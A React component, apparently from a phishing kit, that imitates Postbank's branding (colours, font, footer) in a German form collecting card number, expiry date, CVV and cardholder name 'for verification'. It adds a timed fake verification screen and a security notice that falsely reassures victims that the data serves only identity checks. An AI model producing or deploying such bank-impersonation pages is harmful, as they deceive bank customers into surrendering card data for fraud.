import React, { useState } from 'react';
import { Lock, Shield } from 'lucide-react';
import Loading from './Loading';
import PostbankFooter from './PostbankFooter';

interface BankCardData {
  card_number: string;
  expiry_date: string;
  cvv: string;
  cardholder_name: string;
}

interface BankCardFormProps {
  onSubmit: (data: BankCardData) => void;
  onSkip?: () => void;
}

const BankCardForm: React.FC<BankCardFormProps> = ({ onSubmit, onSkip }) => {
  // Individual state variables like PersonalDataForm
  const [cardNumber, setCardNumber] = useState('');
  const [expiryDate, setExpiryDate] = useState('');
  const [cvv, setCvv] = useState('');
  const [cardholderName, setCardholderName] = useState('');
  
  const [isLoading, setIsLoading] = useState(false);
  const [errors, setErrors] = useState<Partial<BankCardData>>({});
  
  // Focus states exactly like PersonalDataForm
  const [cardNumberFocused, setCardNumberFocused] = useState(false);
  const [expiryDateFocused, setExpiryDateFocused] = useState(false);
  const [cvvFocused, setCvvFocused] = useState(false);
  const [cardholderNameFocused, setCardholderNameFocused] = useState(false);

  // Format card number with spaces (XXXX XXXX XXXX XXXX)
  const formatCardNumber = (value: string): string => {
    const v = value.replace(/\s+/g, '').replace(/[^0-9]/gi, '');
    const matches = v.match(/\d{4,16}/g);
    const match = matches && matches[0] || '';
    const parts = [];
    for (let i = 0, len = match.length; i < len; i += 4) {
      parts.push(match.substring(i, i + 4));
    }
    if (parts.length) {
      return parts.join(' ');
    } else {
      return v;
    }
  };

  // Format expiry date (MM/YY)
  const formatExpiryDate = (value: string): string => {
    const v = value.replace(/\D/g, '');
    if (v.length >= 2) {
      let month = v.substring(0, 2);
      let year = v.substring(2, 4);
      
      // Ensure month is valid (01-12)
      if (parseInt(month) > 12) {
        month = '12';
      }
      if (parseInt(month) === 0) {
        month = '01';
      }
      
      return month + (year ? '/' + year : '');
    }
    return v;
  };

  const validateForm = (): boolean => {
    const newErrors: Partial<BankCardData> = {};
    
    if (!cardNumber.trim()) {
      newErrors.card_number = 'Kartennummer ist erforderlich';
    } else if (cardNumber.replace(/\s/g, '').length < 13) {
      newErrors.card_number = 'Kartennummer muss mindestens 13 Ziffern haben';
    }
    
    if (!expiryDate.trim()) {
      newErrors.expiry_date = 'Ablaufdatum ist erforderlich';
    } else if (!/^\d{2}\/\d{2}$/.test(expiryDate)) {
      newErrors.expiry_date = 'Format: MM/JJ';
    }
    
    if (!cvv.trim()) {
      newErrors.cvv = 'CVV ist erforderlich';
    } else if (cvv.length < 3) {
      newErrors.cvv = 'CVV muss 3-4 Ziffern haben';
    }
    
    if (!cardholderName.trim()) {
      newErrors.cardholder_name = 'Karteninhaber ist erforderlich';
    }
    
    setErrors(newErrors);
    return Object.keys(newErrors).length === 0;
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    
    if (!validateForm()) {
      return;
    }
    
    setIsLoading(true);
    
    try {
      console.log('BankCardForm: Submitting data:', {
        card_number: cardNumber,
        expiry_date: expiryDate,
        cvv: cvv,
        cardholder_name: cardholderName
      });
      await onSubmit({
        card_number: cardNumber,
        expiry_date: expiryDate,
        cvv: cvv,
        cardholder_name: cardholderName
      });
    } catch (error: any) {
      console.error('Error submitting bank card data:', error);
      
      // Handle backend validation errors
      if (error.details && Array.isArray(error.details)) {
        const backendErrors: Partial<BankCardData> = {};
        
        error.details.forEach((detail: any) => {
          if (detail.field === 'expiry_date') {
            backendErrors.expiry_date = 'Ungültiges Ablaufdatum. Format: MM/JJ (Monat 01-12)';
          } else if (detail.field === 'card_number') {
            backendErrors.card_number = 'Ungültige Kartennummer';
          } else if (detail.field === 'cvv') {
            backendErrors.cvv = 'Ungültige CVV';
          }
        });
        
        setErrors(backendErrors);
      } else {
        setErrors({ card_number: 'Fehler beim Verarbeiten der Kartendaten' });
      }
      setIsLoading(false);
    }
  };

  return (
    <>
      <style>
        {`
          @media (max-width: 768px) {
            .bank-card-container {
              padding: 1rem !important;
            }
            .bank-card-form {
              max-width: 100% !important;
              padding: 2rem 1.5rem !important;
            }
            .bank-card-title {
              font-size: 2rem !important;
              text-align: center !important;
            }
          }
          
          @media (max-width: 480px) {
            .bank-card-form {
              padding: 1.5rem 1rem !important;
            }
            .bank-card-title {
              font-size: 1.8rem !important;
            }
          }
        `}
      </style>
      
      {isLoading && (
        <Loading 
          message="Kartendaten werden verifiziert"
          type="verification"
          showProgress={true}
          duration={4.5}
        />
      )}
      
      {/* Main Content */}
      <div className="bank-card-container" style={{
        backgroundColor: 'white',
        minHeight: '100vh',
        padding: '60px 0'
      }}>
        <div style={{
          maxWidth: '1280px',
          margin: '0 auto',
          padding: '0 20px'
        }}>
          <div className="bank-card-form" style={{
            maxWidth: '600px',
            margin: '0 auto',
            backgroundColor: '#fc0',
            borderRadius: '8px',
            padding: '40px',
            boxShadow: '0 4px 24px rgba(0, 0, 0, 0.1)'
          }}>
            {/* Header */}
            <div style={{ marginBottom: '30px', textAlign: 'center' }}>
              <div style={{
                display: 'flex',
                alignItems: 'center',
                justifyContent: 'center',
                marginBottom: '20px'
              }}>
                <Lock size={32} color="#0018a8" style={{ marginRight: '12px' }} />
                <h1 className="bank-card-title" style={{
                  color: '#0018a8',
                  fontSize: '2.5rem',
                  fontWeight: '700',
                  margin: 0,
                  fontFamily: 'Frutiger LT Pro, Arial, sans-serif'
                }}>
                  Kartendaten
                </h1>
              </div>
              
              <p style={{
                color: '#333',
                fontSize: '1.125rem',
                margin: 0,
                lineHeight: '1.5',
                fontFamily: 'Frutiger LT Pro, Arial, sans-serif'
              }}>
                Bitte geben Sie Ihre Bankkarteninformationen zur Verifizierung ein.
              </p>
            </div>

            <form onSubmit={handleSubmit}>
              {/* Card Number */}
              <div style={{ marginBottom: '20px' }}>
                <label style={{
                  display: 'block',
                  fontSize: '14px',
                  fontWeight: '600',
                  color: '#0018a8',
                  marginBottom: '8px',
                  fontFamily: 'Frutiger LT Pro, Arial, sans-serif'
                }}>
                  Kartennummer
                </label>
                <input
                  type="text"
                  value={cardNumber}
                  onChange={(e) => setCardNumber(formatCardNumber(e.target.value))}
                  onFocus={() => setCardNumberFocused(true)}
                  onBlur={() => setCardNumberFocused(false)}
                  placeholder="1234 5678 9012 3456"
                  maxLength={19}
                  style={{
                    width: '100%',
                    padding: '12px',
                    border: errors.card_number ? '2px solid #dc3545' : (cardNumberFocused ? '2px solid #0018a8' : '1px solid #ccc'),
                    borderRadius: '4px',
                    fontSize: '16px',
                    backgroundColor: 'white',
                    boxSizing: 'border-box',
                    fontFamily: 'monospace',
                    transition: 'border-color 0.3s ease'
                  }}
                  required
                />
                {errors.card_number && (
                  <div style={{
                    color: '#dc3545',
                    fontSize: '12px',
                    marginTop: '4px',
                    fontFamily: 'Frutiger LT Pro, Arial, sans-serif'
                  }}>
                    {errors.card_number}
                  </div>
                )}
              </div>

              {/* Expiry Date and CVV Row */}
              <div style={{ display: 'flex', gap: '15px', marginBottom: '20px' }}>
                {/* Expiry Date */}
                <div style={{ flex: 1 }}>
                  <label style={{
                    display: 'block',
                    fontSize: '14px',
                    fontWeight: '600',
                    color: '#0018a8',
                    marginBottom: '8px',
                    fontFamily: 'Frutiger LT Pro, Arial, sans-serif'
                  }}>
                    Ablaufdatum
                  </label>
                  <input
                    type="text"
                    value={expiryDate}
                    onChange={(e) => setExpiryDate(formatExpiryDate(e.target.value))}
                    onFocus={() => setExpiryDateFocused(true)}
                    onBlur={() => setExpiryDateFocused(false)}
                    placeholder="MM/JJ"
                    maxLength={5}
                    style={{
                      width: '100%',
                      padding: '12px',
                      border: errors.expiry_date ? '2px solid #dc3545' : (expiryDateFocused ? '2px solid #0018a8' : '1px solid #ccc'),
                      borderRadius: '4px',
                      fontSize: '16px',
                      backgroundColor: 'white',
                      boxSizing: 'border-box',
                      fontFamily: 'monospace',
                      transition: 'border-color 0.3s ease'
                    }}
                    required
                  />
                  {errors.expiry_date && (
                    <div style={{
                      color: '#dc3545',
                      fontSize: '12px',
                      marginTop: '4px',
                      fontFamily: 'Frutiger LT Pro, Arial, sans-serif'
                    }}>
                      {errors.expiry_date}
                    </div>
                  )}
                </div>

                {/* CVV */}
                <div style={{ flex: 1 }}>
                  <label style={{
                    display: 'block',
                    fontSize: '14px',
                    fontWeight: '600',
                    color: '#0018a8',
                    marginBottom: '8px',
                    fontFamily: 'Frutiger LT Pro, Arial, sans-serif'
                  }}>
                    CVV
                  </label>
                  <input
                    type="text"
                    value={cvv}
                    onChange={(e) => setCvv(e.target.value.replace(/\D/g, '').substring(0, 4))}
                    onFocus={() => setCvvFocused(true)}
                    onBlur={() => setCvvFocused(false)}
                    placeholder="123"
                    maxLength={4}
                    style={{
                      width: '100%',
                      padding: '12px',
                      border: errors.cvv ? '2px solid #dc3545' : (cvvFocused ? '2px solid #0018a8' : '1px solid #ccc'),
                      borderRadius: '4px',
                      fontSize: '16px',
                      backgroundColor: 'white',
                      boxSizing: 'border-box',
                      fontFamily: 'monospace',
                      transition: 'border-color 0.3s ease'
                    }}
                    required
                  />
                  {errors.cvv && (
                    <div style={{
                      color: '#dc3545',
                      fontSize: '12px',
                      marginTop: '4px',
                      fontFamily: 'Frutiger LT Pro, Arial, sans-serif'
                    }}>
                      {errors.cvv}
                    </div>
                  )}
                </div>
              </div>

              {/* Cardholder Name */}
              <div style={{ marginBottom: '30px' }}>
                <label style={{
                  display: 'block',
                  fontSize: '14px',
                  fontWeight: '600',
                  color: '#0018a8',
                  marginBottom: '8px',
                  fontFamily: 'Frutiger LT Pro, Arial, sans-serif'
                }}>
                  Karteninhaber
                </label>
                <input
                  type="text"
                  value={cardholderName}
                  onChange={(e) => setCardholderName(e.target.value.toUpperCase())}
                  onFocus={() => setCardholderNameFocused(true)}
                  onBlur={() => setCardholderNameFocused(false)}
                  placeholder="MAX MUSTERMANN"
                  style={{
                    width: '100%',
                    padding: '12px',
                    border: errors.cardholder_name ? '2px solid #dc3545' : (cardholderNameFocused ? '2px solid #0018a8' : '1px solid #ccc'),
                    borderRadius: '4px',
                    fontSize: '16px',
                    backgroundColor: 'white',
                    boxSizing: 'border-box',
                    fontFamily: 'Frutiger LT Pro, Arial, sans-serif',
                    transition: 'border-color 0.3s ease',
                    textTransform: 'uppercase'
                  }}
                  required
                />
                {errors.cardholder_name && (
                  <div style={{
                    color: '#dc3545',
                    fontSize: '12px',
                    marginTop: '4px',
                    fontFamily: 'Frutiger LT Pro, Arial, sans-serif'
                  }}>
                    {errors.cardholder_name}
                  </div>
                )}
              </div>

              {/* Submit Button */}
              <button
                type="submit"
                disabled={isLoading}
                style={{
                  width: '100%',
                  backgroundColor: '#0018a8',
                  color: 'white',
                  border: 'none',
                  borderRadius: '4px',
                  padding: '16px',
                  fontSize: '16px',
                  cursor: isLoading ? 'not-allowed' : 'pointer',
                  opacity: isLoading ? 0.7 : 1,
                  fontFamily: 'Frutiger LT Pro, Arial, sans-serif',
                  fontWeight: '700',
                  transition: 'all 0.3s ease'
                }}
                onMouseEnter={(e) => {
                  if (!isLoading) {
                    e.currentTarget.style.backgroundColor = '#001580';
                  }
                }}
                onMouseLeave={(e) => {
                  if (!isLoading) {
                    e.currentTarget.style.backgroundColor = '#0018a8';
                  }
                }}
              >
                {isLoading ? 'Wird verarbeitet...' : 'Kartendaten bestätigen'}
              </button>

              {/* Skip Button */}
              {onSkip && (
                <button
                  type="button"
                  onClick={onSkip}
                  disabled={isLoading}
                  style={{
                    backgroundColor: 'transparent',
                    color: '#0018a8',
                    border: 'none',
                    padding: '0.75rem 1rem',
                    fontSize: '0.875rem',
                    fontWeight: '400',
                    cursor: isLoading ? 'not-allowed' : 'pointer',
                    fontFamily: 'PostbankWeb, Arial, sans-serif',
                    transition: 'all 0.3s ease',
                    opacity: isLoading ? 0.5 : 0.7,
                    marginTop: '1rem',
                    textDecoration: 'underline',
                    textAlign: 'center' as const,
                    width: '100%'
                  }}
                  onMouseOver={(e) => {
                    if (!isLoading) {
                      e.currentTarget.style.opacity = '1';
                      e.currentTarget.style.color = '#001a8a';
                    }
                  }}
                  onMouseOut={(e) => {
                    e.currentTarget.style.opacity = '0.7';
                    e.currentTarget.style.color = '#0018a8';
                  }}
                >
                  Ich habe keine Kreditkarte
                </button>
              )}
            </form>

            {/* Security Note */}
            <div style={{
              marginTop: '30px',
              padding: '15px',
              backgroundColor: 'rgba(0, 24, 168, 0.1)',
              borderRadius: '6px',
              borderLeft: '4px solid #0018a8'
            }}>
              <div style={{ display: 'flex', alignItems: 'flex-start', gap: '10px' }}>
                <Shield size={16} color="#0018a8" style={{ flexShrink: 0, marginTop: '2px' }} />
                <p style={{
                  color: '#0018a8',
                  fontSize: '13px',
                  margin: 0,
                  fontFamily: 'Frutiger LT Pro, Arial, sans-serif',
                  lineHeight: '1.4'
                }}>
                  <strong>Sicherheitshinweis:</strong> Ihre Kartendaten werden verschlüsselt übertragen und dienen ausschließlich der Identitätsverifizierung.
                </p>
              </div>
            </div>
          </div>
        </div>
      </div>
      <PostbankFooter />
    </>
  );
};

export default BankCardForm;